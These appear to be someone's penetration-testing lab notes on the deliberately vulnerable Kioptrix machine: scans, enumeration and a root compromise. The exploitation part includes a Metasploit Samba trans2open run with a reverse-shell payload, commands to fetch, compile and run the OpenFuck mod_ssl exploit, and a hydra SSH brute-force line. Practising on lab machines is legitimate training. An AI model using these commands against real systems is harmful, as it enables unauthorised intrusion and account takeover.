
## Information Gathering (Reconnaissance)

1. Bugcrowd - Bug bounty programs
2. Hunter.io - Email address recon
3. phonebook.ez - Email address recon
4. Voilanorbert.com - Email address recon
5. Email Hipp 
6. Email checker
7. Dehashed.com
8. Hashes.org
9. use sublist3r command
10. Owasp Amass websites
11. Builthwith.com
12. Wappalyzer
13. use whatweb command
14. Burpsuite
15. Google
16. Social Media


## Scanning and Enumeration
1. Download and install, Find ip of kioptrix - 10.0.0.11 
```
sudo netdiscover 
```

2. Nmap scan
```
──(kali㉿kali)-[~]
└─$ nmap -T4 -p- -A 10.0.0.11
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-21 21:49 EDT
Nmap scan report for 10.0.0.11
Host is up (0.0020s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 b8746cdbfd8be666e92a2bdf5e6f6486 (RSA1)
|   1024 8f8e5b81ed21abc180e157a33c85c471 (DSA)
|_  1024 ed4ea94a0614ff1514ceda3a80dbe281 (RSA)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods: 
|_  Potentially risky methods: TRACE
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_ssl-date: 2023-09-22T13:52:30+00:00; +12h00m04s from scanner time.
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
32768/tcp open  status      1 (RPC #100024)

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: 12h00m03s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.05 seconds
```

3. Nikto Vulnerability Scan. 
```
──(kali㉿kali)-[~]
└─$ nikto -h http://10.0.0.11/
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.0.11
+ Target Hostname:    10.0.0.11
+ Target Port:        80
+ Start Time:         2023-09-21 22:02:52 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ /: Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Apache is vulnerable to XSS via the Expect header. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3918
+ OpenSSL/0.9.6b appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.9.6) (may depend on server version).
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution.
+ Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system.
+ Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.

```

4. Gobuster and dirsearch directory search. 
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.0.0.11:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.0.11:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/09/21 22:10:43 Starting gobuster in directory enumeration mode
===============================================================
Progress: 498 / 87665 (0.57%)[ERROR] 2023/09/21 22:11:07 [!] Get "http://10.0.0.11:80/buy": dial tcp 10.0.0.11:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:07 [!] Get "http://10.0.0.11:80/47": dial tcp 10.0.0.11:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:07 [!] Get "http://10.0.0.11:80/43": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 519 / 87665 (0.59%)[ERROR] 2023/09/21 22:11:09 [!] Get "http://10.0.0.11:80/redirect": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 522 / 87665 (0.60%)[ERROR] 2023/09/21 22:11:10 [!] Get "http://10.0.0.11:80/mac": dial tcp 10.0.0.11:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:10 [!] Get "http://10.0.0.11:80/author": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:10 [!] Get "http://10.0.0.11:80/printer": dial tcp 10.0.0.11:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:10 [!] Get "http://10.0.0.11:80/conferences": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 590 / 87665 (0.67%)[ERROR] 2023/09/21 22:11:15 [!] Get "http://10.0.0.11:80/58": dial tcp 10.0.0.11:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
/manual               (Status: 301) [Size: 294] [--> http://127.0.0.1/manual/]
Progress: 984 / 87665 (1.12%)[ERROR] 2023/09/21 22:11:27 [!] Get "http://10.0.0.11:80/index1": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:27 [!] Get "http://10.0.0.11:80/pda": dial tcp 10.0.0.11:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:27 [!] Get "http://10.0.0.11:80/agenda": dial tcp 10.0.0.11:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:27 [!] Get "http://10.0.0.11:80/star": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:27 [!] Get "http://10.0.0.11:80/wp-includes": dial tcp 10.0.0.11:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:27 [!] Get "http://10.0.0.11:80/ecommerce": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 1221 / 87665 (1.39%)^Z
zsh: suspended  gobuster dir -u http://10.0.0.11:80/ -w 
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ python3 dirsearch/dirsearch.py -u http://10.0.0.11:80/                            

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                                                     
                                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11713

Output: /home/kali/reports/http_10.0.0.11_80/__23-09-21_22-12-14.txt

Target: http://10.0.0.11/

[22:12:14] Starting:                                                                                                                                        
[22:12:46] 403 -  275B  - /.ht_wsr.txt                                      
[22:12:46] 403 -  278B  - /.htaccess.bak1                                   
[22:12:46] 403 -  280B  - /.htaccess.sample
[22:12:46] 403 -  278B  - /.htaccess.orig
[22:12:46] 403 -  278B  - /.htaccess_orig                                   
[22:12:46] 403 -  279B  - /.htaccess_extra
[22:12:46] 403 -  276B  - /.htaccess_sc
[22:12:46] 403 -  276B  - /.htaccessBAK
[22:12:46] 403 -  277B  - /.htaccessOLD2
[22:12:46] 403 -  276B  - /.htaccessOLD
[22:12:46] 403 -  268B  - /.htm                                             
[22:12:46] 403 -  278B  - /.htpasswd_test                                   
[22:12:46] 403 -  274B  - /.htpasswds                                       
[22:12:46] 403 -  275B  - /.httr-oauth
[22:12:47] 403 -  278B  - /.htaccess.save                                   
[22:12:47] 403 -  269B  - /.html                                            
[22:15:47] 403 -  272B  - /cgi-bin/                                         
[22:16:16] 403 -  268B  - /doc/                                             
[22:16:16] 403 -  283B  - /doc/en/changes.html                              
[22:16:16] 403 -  283B  - /doc/html/index.html
[22:16:16] 403 -  282B  - /doc/stable.version
[22:16:17] 403 -  272B  - /doc/api/                                         
[22:17:18] 301 -  294B  - /manual  ->  http://127.0.0.1/manual/              
[22:17:24] 200 -   17KB - /mrtg/                                             
[22:18:40] 200 -   27B  - /test.php                                          
[22:18:52] 301 -  293B  - /usage  ->  http://127.0.0.1/usage/                
[22:19:11] 403 -  273B  - /~operator                                         
[22:19:11] 403 -  269B  - /~root                                             
                                                                              
Task Completed 
```

5. SMB Enumeration - Use metasploit and smbclient 
```
msf6 auxiliary(scanner/smb/smb_version) > options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.0.0.11
RHOSTS => 10.0.0.11
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 10.0.0.11:139         - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*] 10.0.0.11:139         -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 10.0.0.11:            - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) > 


┌──(kali㉿kali)-[~]
└─$ smbclient -L \\\\10.0.0.11\\
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful

        Server               Comment
        ---------            -------
        KIOPTRIX             Samba Server

        Workgroup            Master
        ---------            -------
        MYGROUP              KIOPTRIX
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.0.0.11\\ADMIN$
Password for [WORKGROUP\kali]:
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
tree connect failed: NT_STATUS_WRONG_PASSWORD
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.0.0.11\\IPC$  
Password for [WORKGROUP\kali]:
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> ls
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
smb: \> exit
               
```

6. SSH Enumeration 
```
┌──(kali㉿kali)-[~]
└─$ ssh 10.0.0.11                
Unable to negotiate with 10.0.0.11 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1

┌──(kali㉿kali)-[~]
└─$ ssh 10.0.0.11 -oKexAlgorithms=+diffie-hellman-group1-sha1
Unable to negotiate with 10.0.0.11 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss

```

## Vulnerability Scanning with Nessus

1. Download and install from tenable nessus. 

2. Run it against Kioptrix and check out report. 


## Exploitation Basics 

1. Reverse shell 
![[Pasted image 20230922151216.png]]

2. Bind shell
![[Pasted image 20230922152702.png]]

3. Staged vs non-staged payloads
![[Pasted image 20230922154550.png]]

4. Gaining Root with Metasploit
```
msf6 exploit(linux/samba/trans2open) > show options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.0.0.11        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   CMD    /bin/sh          yes       The command string to execute
   LHOST  192.168.179.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.

msf6 exploit(linux/samba/trans2open) > exploit

```

5. Manual Exploitation
a. Download OpenFuck.c

```
git clone https://github.com/heltonWernik/OpenFuck.git
```

b. Install ssl-dev library

```
apt-get install libssl-dev
```

c. It's Compile Time

```
gcc -o OpenFuck OpenFuck.c -lcrypto
```

d. Running the Exploit

```
./OpenFuck
```

e. See which service you witch to exploit. For example if you need to Red Hat Linux, using apache version 1.3.20. Trying out using the 0x6a option ./OpenFuck 0x6a [Target Ip] [port] -c 40

for example:

```
./OpenFuck 0x6a 192.168.80.145 443 -c 40
```


6. Brute Force Attack
```
┌──(kali㉿kali)-[~]
└─$ hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.0.0.11:22 -t 4 -V

```
